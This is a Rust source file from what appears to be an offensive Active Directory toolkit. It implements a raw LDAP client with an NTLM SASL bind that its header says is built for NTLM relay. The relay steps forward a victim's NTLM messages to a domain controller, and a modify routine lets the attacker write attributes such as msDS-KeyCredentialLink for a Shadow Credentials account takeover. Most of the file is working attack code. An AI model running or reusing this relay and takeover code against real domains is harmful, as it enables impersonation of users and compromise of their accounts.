//! Raw LDAP client (BER by hand) with NTLM SASL (GSS-SPNEGO) bind over plaintext 389.
//!
//! Two uses: (1) authenticate with a password/hash where a DC requires signing and LDAPS is
//! unusable (closes the LDAP-389 gap); (2) NTLM **relay** — the bind is exposed as discrete
//! steps (`sasl_step1`/`sasl_step2`) so a relay server can forward a victim's Type1/Type3 and
//! act as the victim (e.g. write msDS-KeyCredentialLink → Shadow Credentials → takeover).

use adhammer_ntlm::Ntlm;
use adhammer_smb::spnego;
use anyhow::{anyhow, bail, Context, Result};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

// ---- BER encoding (definite length) ---------------------------------------

fn der_len(n: usize) -> Vec<u8> {
    if n < 0x80 {
        vec![n as u8]
    } else {
        let mut body = Vec::new();
        let mut v = n;
        while v > 0 {
            body.insert(0, (v & 0xff) as u8);
            v >>= 8;
        }
        let mut out = vec![0x80 | body.len() as u8];
        out.extend(body);
        out
    }
}

fn tlv(tag: u8, value: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend(der_len(value.len()));
    out.extend_from_slice(value);
    out
}

fn seq(children: &[Vec<u8>]) -> Vec<u8> {
    tlv(0x30, &children.concat())
}
fn octet(b: &[u8]) -> Vec<u8> {
    tlv(0x04, b)
}
fn integer(v: i64) -> Vec<u8> {
    // minimal two's-complement, at least one byte
    let mut bytes = v.to_be_bytes().to_vec();
    while bytes.len() > 1 && ((bytes[0] == 0 && bytes[1] & 0x80 == 0) || (bytes[0] == 0xff && bytes[1] & 0x80 != 0)) {
        bytes.remove(0);
    }
    tlv(0x02, &bytes)
}
fn enumerated(v: i64) -> Vec<u8> {
    let e = integer(v);
    tlv(0x0a, &e[e.len() - 1..]) // reuse the single content byte
}
fn boolean(b: bool) -> Vec<u8> {
    tlv(0x01, &[if b { 0xff } else { 0x00 }])
}

// ---- BER decoding ---------------------------------------------------------

/// Read one TLV at `pos`; return (tag, content_start, length, next_pos).
fn read_tlv(buf: &[u8], pos: usize) -> Result<(u8, usize, usize, usize)> {
    let tag = *buf.get(pos).ok_or_else(|| anyhow!("BER: truncated tag"))?;
    let b0 = *buf.get(pos + 1).ok_or_else(|| anyhow!("BER: truncated length"))?;
    let (len, hdr) = if b0 & 0x80 == 0 {
        (b0 as usize, 2)
    } else {
        let n = (b0 & 0x7f) as usize;
        let mut l = 0usize;
        for i in 0..n {
            l = (l << 8) | *buf.get(pos + 2 + i).ok_or_else(|| anyhow!("BER: truncated length"))? as usize;
        }
        (l, 2 + n)
    };
    Ok((tag, pos + hdr, len, pos + hdr + len))
}

// ---- LDAP client ----------------------------------------------------------

pub struct LdapClient {
    stream: TcpStream,
    msg_id: i64,
}

impl LdapClient {
    pub async fn connect(addr: &str) -> Result<Self> {
        let addr = if addr.contains(':') { addr.to_string() } else { format!("{addr}:389") };
        let stream = TcpStream::connect(&addr).await.context("ldap connect")?;
        Ok(LdapClient { stream, msg_id: 0 })
    }

    /// Send an LDAPMessage wrapping `protocol_op` and read the next full LDAPMessage back.
    async fn exchange(&mut self, protocol_op: Vec<u8>) -> Result<Vec<u8>> {
        self.msg_id += 1;
        let msg = seq(&[integer(self.msg_id), protocol_op]);
        self.stream.write_all(&msg).await?;
        // Read one LDAP message: tag(1) + length + content.
        let mut head = [0u8; 2];
        self.stream.read_exact(&mut head).await?;
        let mut total;
        let mut prefix = vec![head[0], head[1]];
        if head[1] & 0x80 == 0 {
            total = head[1] as usize;
        } else {
            let n = (head[1] & 0x7f) as usize;
            let mut lb = vec![0u8; n];
            self.stream.read_exact(&mut lb).await?;
            total = 0;
            for b in &lb {
                total = (total << 8) | *b as usize;
            }
            prefix.extend(lb);
        }
        let mut body = vec![0u8; total];
        self.stream.read_exact(&mut body).await?;
        prefix.extend(body);
        Ok(prefix)
    }

    /// Send a SASL GSS-SPNEGO bind carrying `spnego_token`; return the bindResponse's
    /// (resultCode, serverSaslCreds).
    async fn sasl_bind(&mut self, spnego_token: &[u8]) -> Result<(i64, Vec<u8>)> {
        let sasl = tlv(0xa3, &[octet(b"GSS-SPNEGO"), octet(spnego_token)].concat()); // [3] SaslCredentials
        let bind_req = tlv(0x60, &[integer(3), octet(b""), sasl].concat()); // [APP 0] BindRequest
        let resp = self.exchange(bind_req).await?;
        // LDAPMessage: SEQ { msgID, [APP 1] BindResponse { resultCode ENUM, matchedDN, diag, [7] saslCreds? } }
        let (_, c, _, _) = read_tlv(&resp, 0)?; // outer SEQ content start
        let (_, _mc, ml, after_id) = read_tlv(&resp, c)?; // messageID
        let _ = ml;
        let (_, bc, _, _) = read_tlv(&resp, after_id)?; // [APP 1] content
        let (_, rc, rl, next) = read_tlv(&resp, bc)?; // resultCode ENUM
        let result_code = resp[rc..rc + rl].iter().fold(0i64, |a, &b| (a << 8) | b as i64);
        // skip matchedDN, diagnosticMessage; look for [7] serverSaslCreds (context primitive 0x87)
        let mut p = next;
        let mut sasl_creds = Vec::new();
        while p < bc + (read_tlv(&resp, after_id)?.2) {
            let (t, cc, cl, nn) = read_tlv(&resp, p)?;
            if t == 0x87 {
                sasl_creds = resp[cc..cc + cl].to_vec();
            }
            p = nn;
        }
        Ok((result_code, sasl_creds))
    }

    /// Bind step 1 for a relay: send the victim's Type1, return the server's Type2.
    pub async fn sasl_step1(&mut self, type1: &[u8]) -> Result<Vec<u8>> {
        let (_rc, creds) = self.sasl_bind(&spnego::negotiate_init(type1)).await?;
        spnego::find_ntlm(&creds).map(|t| t.to_vec()).ok_or_else(|| anyhow!("no NTLM challenge in bindResponse"))
    }

    /// Bind step 2 for a relay: send the victim's Type3; Ok(()) iff the bind succeeded.
    pub async fn sasl_step2(&mut self, type3: &[u8]) -> Result<()> {
        let (rc, _) = self.sasl_bind(&spnego::negotiate_resp(type3)).await?;
        match rc {
            0 => Ok(()),
            8 => bail!("resultCode 8 (strongAuthRequired) — auth OK but the DC enforces LDAP \
                        signing; use LDAPS, or this target isn't relayable to LDAP"),
            49 => bail!("resultCode 49 (invalidCredentials)"),
            other => bail!("LDAP SASL bind failed: resultCode {other}"),
        }
    }

    /// Full NTLM SASL bind with a password (own-credential auth over 389, signing-agnostic).
    pub async fn bind_ntlm(&mut self, domain: &str, user: &str, password: &str, workstation: &str) -> Result<()> {
        let ntlm = Ntlm::new();
        let challenge = self.sasl_step1(ntlm.negotiate()).await?;
        let (type3, _key) = ntlm
            .authenticate(&challenge, domain, user, password, workstation)
            .map_err(|e| anyhow!("ntlm authenticate: {e}"))?;
        self.sasl_step2(&type3).await
    }

    /// Search under `base` for `(sAMAccountName=sam)` and return the first entry's DN.
    pub async fn find_dn(&mut self, base: &str, sam: &str) -> Result<String> {
        // Filter: equalityMatch [3] { attributeDesc, assertionValue }
        let filter = tlv(0xa3, &[octet(b"sAMAccountName"), octet(sam.as_bytes())].concat());
        let req = tlv(
            0x63, // [APP 3] SearchRequest
            &[
                octet(base.as_bytes()),
                enumerated(2), // scope: wholeSubtree
                enumerated(0), // derefAliases: never
                integer(1),    // sizeLimit
                integer(0),    // timeLimit
                boolean(false),
                filter,
                seq(&[]), // attributes: none (DN only)
            ]
            .concat(),
        );
        let resp = self.exchange(req).await?;
        // Expect a SearchResultEntry [APP 4]; objectName is the first field (its DN).
        let (_, c, _, _) = read_tlv(&resp, 0)?;
        let (_, _mc, _ml, after_id) = read_tlv(&resp, c)?;
        let (t, ec, _el, _) = read_tlv(&resp, after_id)?;
        if t != 0x64 {
            bail!("no matching object for sAMAccountName={sam}");
        }
        let (_, dc, dl, _) = read_tlv(&resp, ec)?; // objectName OCTET STRING
        Ok(String::from_utf8_lossy(&resp[dc..dc + dl]).into_owned())
    }

    /// ModifyRequest: add `value` to attribute `attr` on `dn` (op=add).
    pub async fn modify_add(&mut self, dn: &str, attr: &str, value: &[u8]) -> Result<()> {
        let partial = seq(&[octet(attr.as_bytes()), tlv(0x31, &octet(value))]); // { type, vals SET }
        let change = seq(&[enumerated(0), partial]); // { operation add(0), modification }
        let req = tlv(0x66, &[octet(dn.as_bytes()), seq(&[change])].concat()); // [APP 6] ModifyRequest
        let resp = self.exchange(req).await?;
        // ModifyResponse [APP 7] { resultCode ENUM ... }
        let (_, c, _, _) = read_tlv(&resp, 0)?;
        let (_, _mc, _ml, after_id) = read_tlv(&resp, c)?;
        let (_, mc2, _, _) = read_tlv(&resp, after_id)?;
        let (_, rc, rl, _) = read_tlv(&resp, mc2)?;
        let code = resp[rc..rc + rl].iter().fold(0i64, |a, &b| (a << 8) | b as i64);
        if code != 0 {
            bail!("LDAP modify failed: resultCode {code}");
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ber_integer_is_minimal() {
        assert_eq!(integer(3), vec![0x02, 0x01, 0x03]);
        assert_eq!(integer(256), vec![0x02, 0x02, 0x01, 0x00]);
    }

    #[test]
    fn bind_request_shape() {
        // A SASL bind body should be [APP 0] with version 3 and the SASL [3] choice.
        let sasl = tlv(0xa3, &[octet(b"GSS-SPNEGO"), octet(b"tok")].concat());
        let body = tlv(0x60, &[integer(3), octet(b""), sasl].concat());
        assert_eq!(body[0], 0x60);
        // read back the version
        let (_, c, _, _) = read_tlv(&body, 0).unwrap();
        let (t, vc, _, _) = read_tlv(&body, c).unwrap();
        assert_eq!(t, 0x02);
        assert_eq!(body[vc], 3);
    }

    #[test]
    fn read_tlv_long_form() {
        let mut m = vec![0x04, 0x82, 0x01, 0x00]; // OCTET STRING, length 256
        m.extend(std::iter::repeat(0xAA).take(256));
        let (tag, c, len, next) = read_tlv(&m, 0).unwrap();
        assert_eq!(tag, 0x04);
        assert_eq!(len, 256);
        assert_eq!(c, 4);
        assert_eq!(next, 260);
    }
}
